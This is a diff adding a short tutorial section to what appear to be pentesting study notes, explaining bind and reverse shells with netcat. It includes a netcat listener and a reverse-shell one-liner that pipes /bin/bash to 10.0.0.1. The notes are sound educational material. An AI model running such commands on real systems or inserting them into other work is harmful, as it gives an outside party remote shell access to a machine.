@@ -36,3 +36,41 @@ and it's done
 There are other tools like `metasploit` and `msvenom` which you can make connection with but with different methods.
 
 ___
+# Shell Types
+
+***There are mainly two types of shells:***
+
+## Bind Shell
+
+**The bind shell** is to put a listener on the machine, opening a port for you to make the request from your side and connect.
+
+Putting the listener:
+```bash
+nc -lvnp 69
+```
+
+Connecting the open port:
+```bash
+nc 10.0.0.1 69
+```
+and it's done
+
+## Reverse Shell
+
+The reverse shell is totally the opposite of the bind shell, your side would be the listener side and the other side would be one who is making the request to give you the connection!!
+
+opening a listener on your side: 
+```bash
+nc -lvnp 69
+```
+
+Now make the other side give you the connection:
+```bash
+nc 10.0.0.1 69 -e "/bin/bash"
+```
+
+and it's done
+
+##### There also the interactive and non-interactive shells and the difference between them is that the interactive can take user inputs the non is not
+
+---
